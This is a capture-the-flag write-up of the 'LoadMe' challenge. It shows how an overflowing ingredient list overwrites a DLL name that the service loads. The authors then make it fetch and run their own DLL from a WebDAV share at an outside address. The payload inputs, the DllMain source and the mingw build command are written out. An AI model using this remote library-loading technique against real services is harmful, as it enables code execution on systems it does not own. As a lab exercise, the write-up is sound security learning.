# LoadMe

> We have developed a super soft that gives meal ideas based on ingredients. The service is still in beta but the interface should look like this:  
> 
> nc loadme.insomnihack.ch 1337

Even though it's supposed to be a pwn challenge we get no binary to reverse engineer.

```
$ nc loadme.insomnihack.ch 1337
██╗███╗   ██╗███████╗ ██████╗ ███╗   ███╗███╗   ██╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██║████╗  ██║██╔════╝██╔═══██╗████╗ ████║████╗  ██║██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██╔██╗ ██║██║    ███████║███████║██║     █████╔╝ 
██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║╚██╗██║██║    ██╔══██║██╔══██║██║     ██╔═██╗ 
██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║    ██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

Welcome to the cookery recipe Generator:
Please give a comma-separated list of ingredients:
```

The service asks for a list, prints it back and terminates:

```
< Please give a comma-separated list of ingredients:
> cement,sand,gravel,water
< cement,sand,gravel,water
< Sorry, the kitchen is currently closed
```

The obvious next step is to try a payload like this one:

```
< Please give a comma-separated list of ingredients:
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
```

And this time we get a nice error message along with a stack trace:

```
WARNING Unable to load the dll ,,,,,,,,,,,
CookeryRecipe.exe caused an Access Violation at location 000000005ED5D491 in module wow64.dll DEP violation at location 0000000000000000.

Registers:
eax=00000000 ebx=000b9020 ecx=2b3a867b edx=00000000 esi=000b90e0 edi=013ff944
eip=00000000 esp=013ff86c ebp=013ff968 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202

AddrPC   Params
00000000 00000000 000BA627 00000001
000B1750 00000018 017110A4 017110CC  CookeryRecipe.exe!main  [/work/src/CookeryRecipe.c @ 65]
000B1396 00000000 00000000 000B14C0  CookeryRecipe.exe!__tmainCRTStartup  [/usr/src/mxe/tmp-gcc-i686-w64-mingw32.static/gcc-11.2.0.build_/mingw-w64-v9.0.0/mingw-w64-crt/crt/crtexe.c @ 321]
73FB62C4 011A7000 2A057C0F 00000000  kernel32.dll!0x162c4
772B1B69 FFFFFFFF 772D33EE 00000000  ntdll.dll!0x61b69
772B1B34 000B14C0 011A7000 00000000  ntdll.dll!0x61b34
```

The warning is especially interesting, because it suggests we can try to make it load a library with a specified name, 
which we most likely overwrote providing an input of more than 64 characters.

We've tried to load a library that should load on every Windows system (for example `user32.dll`) and although the app
still crashes with a stracktrace, the warning about not being able to load the dll doesn't show up anymore.

Then we remembered a nifty trick when exploiting Windows challenges at CTFs (especially at onsite events): if we can
somehow invoke a `LoadLibrary` with our own library hosted on a network share, we immediately gain code execution that's
very convenient to use (after all, that's just C code written by us).

Just like before with `user32.dll` we've tried providing a UNC path to a publicly hosted library:

```
< Please give a comma-separated list of ingredients:
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\live.sysinternals.com\tools\autorunsc.exe
< ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\live.sysinternals.com\tools\autorunsc.exe
< CookeryRecipe.exe caused an Access Violation at location 000000005ED5D491 in module wow64.dll DEP violation at location 0000000000000000.
```

And again, there is no warning about not being able to load the library and, what confirms our suspicions that it is
indeed an invocation of `LoadLibary` with an argument provided by us, a few seconds delay (most likely to download the
binary) before the program continued.

We decided it's time to write a library of our own:
```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    system("dir");
    ExitProcess(1);
}
```

Which then can be cross-compiled to a 32-bit Windows library on Linux with mingw:  
```
$ i686-w64-mingw32-g++ kodzik.c -s -shared -o kodzik.dll
```

Last thing we needed to do was to host a public SMB share and lost an hour trying to do so. It turns out that many ISPs
and hosting providers just outright block ports 139 and 445. And rightly so, because the world had enough problems with
vulnerabilities in popular SMB implementations (including Wannacry with its SMB `EternalBlue` exploit). But while looking
at `tcpdump` output trying to debug SMB connectivity we also saw a connection attempt to the tcp/80 port. Quick Google
search revealed that Windows might also try to use WebDAV while resolving UNC paths and that we can even specify
a custom port in the path itself: `\\1.2.3.4@8080\path\to\a\file.dll`.
Knowing that we've set up a WebDAV share using Apache and tried to load our library with the task service:

```
< Please give a comma-separated list of ingredients:
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\1.2.3.4@8080\data\kodzik.dll
< ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\1.2.3.4@8080\data\kodzik.dll
<  Volume in drive C is OS
<  Volume Serial Number is 4A1B-C069
<
<  Directory of C:\Users\Public\loadme
<
< 01/28/2022  05:08 PM    <DIR>          .
< 01/28/2022  05:08 PM    <DIR>          ..
< 01/28/2022  04:19 PM    <DIR>          bin
< 11/24/2021  04:20 PM               186 guardian.bat
< 01/28/2022  05:90 PM             3,290 guardian.ps1
...
```

Only thing left was to find a file with the flag and print it out:
`INS{S0M3T1M3S-PWN-DOES-NOT-REQUIRE-REGISTERS}`.

More like a misc than a pwn if you ask us, but...